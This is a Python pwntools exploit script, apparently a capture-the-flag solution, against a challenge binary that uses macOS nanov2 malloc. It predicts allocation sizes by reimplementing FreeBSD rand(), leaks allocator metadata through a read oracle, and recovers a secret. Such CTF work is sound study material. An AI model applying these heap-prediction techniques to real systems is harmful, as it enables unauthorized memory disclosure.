from pwn import *

context.log_level = 'info'


local_macos = False
if local_macos:
    conn = process('./target_practice', stderr=-3, env={
        'MallocNanoZone': '1',
        'MallocNanoMaxMagazines': '1',
        'FLAG': 'flag{testflag}'
    })

    nano_base = 0x600000000000

else:
    # DEVICE_ID = '...'
    conn = remote('c.sk8.dog', 30001)
    conn.send(f'CONNECT challenge.{DEVICE_ID}:1337 HTTP/1.1\n\n'.encode())
    [conn.recvline() for _ in range(3)] # consume HTTP response status line / headers

    nano_base = 0x280000000


secret_len = 50

# see nanov2_configure_once()
block_units_by_size_class = [2, 10, 11, 10, 5, 3, 3, 4, 3, 2, 2, 2, 2, 2, 1, 2]
first_block_offset_by_size_class = [1]
next_off = 0
for i in range(1, 16):
    next_off += block_units_by_size_class[i - 1] * 64
    first_block_offset_by_size_class.append(next_off)


count = 0
def read(addr: int) -> int:
    global count
    count += 1

    conn.recvuntil(b': ')
    conn.sendline(hex(addr).encode())
    response = conn.recvline()
    if response.strip() == b'miss':
        ret = 0
    else:
        ret = int(response.split()[-1])

    info(f'{addr:#x} -> {ret:#x}')
    return ret


def main():
    cookie = int(conn.recvline().strip().split(b': ')[1], 0)
    info(f'cookie: {cookie:#x}')

    # predict sizes of the 100 allocations
    paddings = [r % 200 for r in rand(cookie, 100)]
    alloc_sizes = [p + secret_len for p in paddings]
    alloc_classes = [s // 16 - 1 if s % 16 == 0 else s // 16 for s in alloc_sizes]

    # read nanov2_block_meta_t.next_slot for each size class
    next_slots = [0] * 16
    for size_class in range(16):
        for off in range(2):
            # don't read metadata of a size class that is currently allocated
            while alloc_classes[count] == size_class:
                read(nano_base)

            val = read(meta_addr_for_size_class(cookie, size_class) + off) << (8 * off)
            next_slots[size_class] = (next_slots[size_class] | val) & 0x7ff

    # read the secret using next_slot to predict allocation address for each size class
    secret = ''
    for i in range(secret_len):
        size_class = alloc_classes[count]
        next_slot = next_slots[size_class]
        next_alloc = alloc_addr_for_slot(cookie, size_class, next_slot)
        secret += chr(read(next_alloc + paddings[count] + i))

    info(f'secret: {secret} in {count} reads')

    # wait for secret check
    while count < 100:
        read(nano_base)

    conn.sendline(secret.encode())
    conn.interactive()


# see nanov2_first_block_for_size_class_in_arena(), nanov2_block_index_to_meta_index()
def meta_addr_for_size_class(cookie: int, size_class: int) -> int:
    block_idx = first_block_offset_by_size_class[size_class]
    block_idx ^= cookie
    meta_idx = ((block_idx >> 6) | (block_idx << 6)) & 0xFFF
    return nano_base + (cookie << 14) + meta_idx * 4


# see nanov2_allocate_from_block_inline(), nanov2_slot_in_block_ptr()
def alloc_addr_for_slot(cookie: int, size_class: int, next_slot: int) -> int:
    block_idx = first_block_offset_by_size_class[size_class]
    block_idx ^= cookie
    return nano_base + (block_idx << 14) + (next_slot - 1) * (size_class + 1) * 16


# see do_rand() in libc/stdlib/FreeBSD/rand.c
def rand(seed: int, count: int):
    state = seed
    for _ in range(count):
        hi, lo = divmod(state, 127773)
        state = (16807 * lo - 2836 * hi) & 0xffffffffffffffff
        if state >= 0x8000000000000000:
            state = (state + 0x7fffffff) & 0xffffffffffffffff

        yield state & 0x7fffffff


main()
